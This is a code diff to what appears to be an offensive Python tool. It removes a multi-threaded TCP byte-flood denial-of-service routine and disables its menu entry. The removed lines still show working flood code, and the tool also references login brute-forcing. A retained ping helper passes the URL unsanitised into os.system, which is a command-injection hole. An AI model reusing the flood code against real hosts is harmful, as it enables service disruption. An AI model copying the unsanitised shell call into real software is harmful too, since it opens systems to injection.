@@ -38,7 +38,6 @@ class Web:
     def __init__(self, url: str):
         self.url = url
 
-    @out_of_order
     def host_online_check(self, ping_time: int = 1) -> bool:
         ping = os.system(f'ping -w {ping_time} {self.url} >ping.cache')
         if ping != 0:
@@ -139,124 +138,9 @@ class DoS:
         self.target_ip = target_ip
         self.target_port = target_port
         self.full_address = (target_ip, target_port)
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
         self.byte_size = byte_size
         self.threads = []
-
-    def initiate_connection(self) -> bool:
-        try:
-            self.sock.connect(self.full_address)
-        except (
-                socket.gaierror,
-                ConnectionError,
-                ConnectionResetError,
-                ConnectionAbortedError,
-                ConnectionRefusedError,
-        ):
-            return False
-
-    def connection_established(self):
-        try:
-            self.sock.connect(self.full_address)
-        except (
-                socket.gaierror,
-                ConnectionError,
-                ConnectionResetError,
-                ConnectionAbortedError,
-                ConnectionRefusedError,
-        ):
-            self.sock.close()
-            return False
-        else:
-            return True
-
-    def byte_flood(self):
-        """
-        This method keeps hitting the server
-        until there is no longer a connection.
-        """
-        host_online = True
-        _bytes = os.urandom(self.byte_size)
-
-        try:
-            while host_online:
-                if not self.initiate_connection():
-                    host_online = False
-
-                self.sock.send(_bytes)
-                self.sock.close()
-        except KeyboardInterrupt:
-            self.terminate_attack()
-
-    def byte_flood_1(self):
-        _bytes = os.urandom(self.byte_size)
-
-        try:
-            while True:
-                self.sock.send(_bytes)
-                self.sock.close()
-        except KeyboardInterrupt:
-            self.terminate_attack()
-
-    def initiate_byte_flood(self):
-        """
-        Uses threads to speed up
-        the packet sending rate.
-        (Target is self.byte_flood)
-        """
-
-        for i in range(100):
-            thread = threading.Thread(target=self.byte_flood)
-            thread.daemon = False
-            self.threads.append(thread)
-
-        for i in range(100):
-            self.threads[i].start()
-
-        for i in range(100):
-            self.threads[i].join()
-
-    def initiate_byte_flood_1(self):
-        """
-        Uses threads to speed up
-        the packet sending rate.
-        (Target is self.byte_flood_1)
-        """
-
-        for i in range(100):
-            thread = threading.Thread(target=self.byte_flood_1)
-            thread.daemon = False
-            self.threads.append(thread)
-
-        for i in range(100):
-            self.threads[i].start()
-
-        for i in range(100):
-            self.threads[i].join()
-
-    def initiate_attack(self):
-        """
-        Starts attack mode 1
-        (stopping as soon as connection is lost)
-        """
-        self.initiate_byte_flood()
-
-    def initiate_attack_1(self):
-        self.initiate_byte_flood_1()
-
-    def terminate_attack(self):
-        print("\nCleaning up..\n")
-
-        for i in range(100):
-            self.threads[i].join()
-
-        exit(0)
-
-    def __repr__(self):
-        print(f"Hitting: {self.target_ip}:{self.target_port}")
-
-        if not self.connection_established():
-            print(f"{self.target_ip}:{self.target_port} is down!")
 
 
 if __name__ == '__main__':
@@ -369,7 +253,8 @@ def web_module():
             login_brute(wl, known_username)  # Brutes login.
         else:
             print("URL is empty, please specify URL.")
-
+    
+    @out_of_order
     def dos_input():
         if os.getuid() == 0:
             ip = input("web(ip)>> ")
@@ -386,7 +271,7 @@ def web_module():
             if confirmation != 'y':
                 web_module()
             else:
-                dos.initiate_attack()
+                pass  # flooding goes here.
         else:
             print("Please run this as root.")
 
